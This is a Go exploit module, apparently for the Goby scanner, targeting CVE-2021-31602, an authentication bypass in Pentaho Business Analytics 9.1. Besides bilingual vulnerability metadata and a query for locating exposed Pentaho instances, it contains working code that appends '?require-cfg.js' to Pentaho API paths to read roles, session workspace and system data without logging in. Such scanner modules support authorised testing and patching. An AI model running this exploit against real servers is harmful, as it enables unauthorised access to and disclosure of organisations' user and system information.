package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Pentaho Business Analytics 9.1 Authentication Bypass (CVE-2021-31602)",
    "Description": "<p>Pentaho Business Analytics is a business analysis platform that enables you to safely access, integrate, operate, visualize and analyze big data assets.</p><p>Attackers can bypass verification by including URL parameters that access any of the Pentaho API endpoints require-cfg.js or require-js-cfg.js.</p>",
    "Impact": "Pentaho Business Analytics 9.1 Authentication Bypass (CVE-2021-31602)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://help.hitachivantara.com/Documentation/Pentaho/9.1\">https://help.hitachivantara.com/Documentation/Pentaho/9.1</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
    "Product": "Pentaho",
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "Translation": {
        "CN": {
            "Name": "Pentaho 业务分析平台9.1版本权限绕过漏洞（CVE-2021-31602）",
            "Description": "<p>Pentaho Business Analytics是一款使您能够安全地访问、集成、操作、可视化和分析大数据资产的业务分析平台。</p><p>攻击者可通过包含访问任意 Pentaho API 端点require-cfg.js或require-js-cfg.js的URL 参数来绕过验证。</p>",
            "Impact": "<p>攻击者可通过包含访问任意 Pentaho API 端点require-cfg.js或require-js-cfg.js的URL 参数来绕过验证。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://help.hitachivantara.com/Documentation/Pentaho/9.1\">https://help.hitachivantara.com/Documentation/Pentaho/9.1</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、升级Apache系统版本。</p>",
            "Product": "Pentaho",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Pentaho Business Analytics 9.1 Authentication Bypass (CVE-2021-31602)",
            "Description": "<p>Pentaho Business Analytics is a business analysis platform that enables you to safely access, integrate, operate, visualize and analyze big data assets.</p><p>Attackers can bypass verification by including URL parameters that access any of the Pentaho API endpoints require-cfg.js or require-js-cfg.js.</p>",
            "Impact": "Pentaho Business Analytics 9.1 Authentication Bypass (CVE-2021-31602)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://help.hitachivantara.com/Documentation/Pentaho/9.1\">https://help.hitachivantara.com/Documentation/Pentaho/9.1</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
            "Product": "Pentaho",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "FofaQuery": "body=\"j_username\" && body=\"j_password\" && body=\"pentaho\"",
    "GobyQuery": "body=\"j_username\" && body=\"j_password\" && body=\"pentaho\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://help.hitachivantara.com/Documentation/Pentaho/9.1",
    "DisclosureDate": "2021-11-07",
    "References": [
        "https://packetstormsecurity.com/files/164784/Pentaho-Business-Analytics-Pentaho-Business-Server-9.1-Authentication-Bypass.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.0",
    "CVEIDs": [
        "CVE-2021-31602"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202111-550"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "apipath",
            "type": "createSelect",
            "value": "version/show,system/executableTypes,userrolelist/systemRoles,session/userWorkspaceDir",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "Pentaho"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10236"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/pentaho/api/system/executableTypes?require-cfg.js"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "executableFileTypeDtoes") {
					return true
				}
			}
			uri1 := "/pentaho/api/userrolelist/allRoles?require-cfg.js"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "roleList") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["apipath"].(string)
			uri := "/pentaho/api/" + cmd + "?require-cfg.js"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
